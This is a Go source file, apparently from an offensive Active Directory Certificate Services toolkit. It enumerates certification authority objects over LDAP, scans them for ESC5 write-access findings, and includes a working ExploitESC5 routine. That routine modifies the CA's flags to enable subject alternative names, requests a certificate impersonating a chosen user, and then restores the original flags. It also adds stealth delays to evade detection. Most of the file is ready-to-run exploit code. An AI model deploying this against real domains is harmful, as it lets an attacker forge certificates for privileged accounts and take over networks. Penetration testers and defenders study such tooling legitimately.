package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"github.com/go-ldap/ldap/v3"
)

// CAObject holds the LDAP attributes of a CA object in the PKI Services container.
type CAObject struct {
	Name               string
	DN                 string
	SecurityDescriptor []byte
}

// EnumerateCAs queries LDAP for CA objects under CN=Certification Authorities.
func EnumerateCAs(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]CAObject, error) {
	baseDN := buildCABaseDN(cfg.Domain)
	filter := "(objectClass=certificationAuthority)"
	attrs := []string{"cn", "distinguishedName", "nTSecurityDescriptor"}

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter, attrs, nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, fmt.Errorf("LDAP search failed: %w", err)
	}

	var cas []CAObject
	for _, entry := range result.Entries {
		select {
		case <-ctx.Done():
			return cas, ctx.Err()
		default:
		}

		ca := CAObject{
			Name:               entry.GetAttributeValue("cn"),
			DN:                 entry.GetAttributeValue("distinguishedName"),
			SecurityDescriptor: entry.GetRawAttributeValue("nTSecurityDescriptor"),
		}
		cas = append(cas, ca)
		stealthDelay(cfg)
	}
	return cas, nil
}

// ScanESC5 enumerates CA objects and returns ESC5 findings — cases where
// non-privileged trustees hold dangerous write access on the CA object itself.
func ScanESC5(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]ESC5Finding, error) {
	cas, err := EnumerateCAs(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate CAs: %w", err)
	}

	var all []ESC5Finding
	for _, ca := range cas {
		select {
		case <-ctx.Done():
			return all, ctx.Err()
		default:
		}

		findings, err := CheckESC5(ca.Name, ca.DN, ca.SecurityDescriptor)
		if err != nil {
			// Instead of Printf, return the error or let EnumerateAll handle it?
			// We will just skip parsing errors on individual CAs for robustness,
			// or log them to stderr.
			continue
		}
		all = append(all, findings...)
	}
	return all, nil
}

type esc5State struct {
	ServiceDN    string `json:"service_dn"`
	OriginalFlag string `json:"original_flag"`
}

// ExploitESC5 exploits dangerous rights (GenericAll, WriteDACL, etc.) on the CA object.
// The exploit path is identical to ESC7: we modify the CA's flags to enable ESC6
// (EDITF_ATTRIBUTESUBJECTALTNAME2), request a certificate, and then restore the flags.
func ExploitESC5(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, caName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC5 Exploitation: ca=%s target=%s\n", caName, targetUPN)

	// Step 1: Find the CA enrollment service object
	baseDN := buildEnrollmentServicesBaseDN(cfg.Domain)
	filter := fmt.Sprintf("(&(objectClass=pKIEnrollmentService)(cn=%s))", ldap.EscapeFilter(caName))

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter,
		[]string{"distinguishedName", "flags", "certificateTemplates"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return nil, nil, fmt.Errorf("enrollment service %q not found: %w", caName, err)
	}

	serviceDN := result.Entries[0].DN
	originalFlags := result.Entries[0].GetAttributeValue("flags")
	if originalFlags == "" {
		originalFlags = "0"
	}

	stateFile := filepath.Join(".", "esc5_restore.json")

	// Check for existing lockfile
	if data, err := os.ReadFile(stateFile); err == nil {
		var state esc5State
		if json.Unmarshal(data, &state) == nil && state.ServiceDN == serviceDN {
			fmt.Println("[!] Found existing ESC5 lockfile. Attempting recovery before proceeding...")
			restoreReq := ldap.NewModifyRequest(state.ServiceDN, nil)
			restoreReq.Replace("flags", []string{state.OriginalFlag})
			conn.Modify(restoreReq)
			os.Remove(stateFile)
			originalFlags = state.OriginalFlag
		}
	}

	stateData, _ := json.Marshal(esc5State{ServiceDN: serviceDN, OriginalFlag: originalFlags})
	os.WriteFile(stateFile, stateData, 0600)

	// Step 2: Modify CA flags to enable EDITF_ATTRIBUTESUBJECTALTNAME2
	var flagsVal uint32
	fmt.Sscanf(originalFlags, "%d", &flagsVal)
	flagsVal |= 0x00040000
	newFlags := fmt.Sprintf("%d", flagsVal)

	fmt.Println("[*] Enabling EDITF_ATTRIBUTESUBJECTALTNAME2 on CA...")
	modReq := ldap.NewModifyRequest(serviceDN, nil)
	modReq.Replace("flags", []string{newFlags})
	if err := conn.Modify(modReq); err != nil {
		os.Remove(stateFile)
		return nil, nil, fmt.Errorf("modify CA flags (need WriteProperty/GenericAll): %w", err)
	}
	fmt.Printf("[+] CA flags modified: %s -> %s\n", originalFlags, newFlags)

	// Step 3: Exploit as ESC6
	enrollTemplate := selectEnrollmentTemplate(cfg, conn, result.Entries[0].GetAttributeValues("certificateTemplates"))
	fmt.Printf("[*] Exploiting CA as ESC6 using template %q...\n", enrollTemplate)
	cert, certKey, err := EnrollCertificate(cfg, enrollTemplate, targetUPN, true)

	// Step 4: Restore original CA flags
	fmt.Println("[*] Restoring original CA configuration...")
	restoreReq := ldap.NewModifyRequest(serviceDN, nil)
	restoreReq.Replace("flags", []string{originalFlags})
	if restoreErr := conn.Modify(restoreReq); restoreErr != nil {
		fmt.Printf("[!] Warning: failed to restore CA flags: %v\n", restoreErr)
	} else {
		fmt.Printf("[+] CA flags restored to original value: %s\n", originalFlags)
		os.Remove(stateFile)
	}

	if err != nil {
		return nil, nil, fmt.Errorf("enrollment via ESC6 failed: %w", err)
	}

	fmt.Printf("[+] ESC5 exploitation successful — modified CA -> ESC6 -> forged cert\n")
	return cert, certKey, nil
}

